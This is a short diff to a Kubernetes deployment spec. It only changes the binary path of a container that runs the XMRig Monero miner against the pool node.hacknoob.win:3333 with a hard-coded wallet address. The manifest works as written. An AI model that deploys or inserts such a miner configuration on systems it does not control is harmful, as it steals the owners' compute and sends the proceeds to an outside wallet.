@@ -30,7 +30,7 @@ spec:
       containers:
         - name: xmrig-container
           image: busybox
-          command: ["sh", "-c", "./xmrig/build/xmrig -t 1 -o node.hacknoob.win:3333 -u 46DWjxWviwCVHbYHaMxjusjGKm55LJmG6f3YTCJDmTf2RxCLfQRx22fSRELvwq36kY6iSGD5tiUsSQ4AsE8UFnWFBDd1Lzn"]
+          command: ["sh", "-c", "/root/xmrig -t 1 -o node.hacknoob.win:3333 -u 46DWjxWviwCVHbYHaMxjusjGKm55LJmG6f3YTCJDmTf2RxCLfQRx22fSRELvwq36kY6iSGD5tiUsSQ4AsE8UFnWFBDd1Lzn"]
           resources:
             limits:
               cpu: "2"
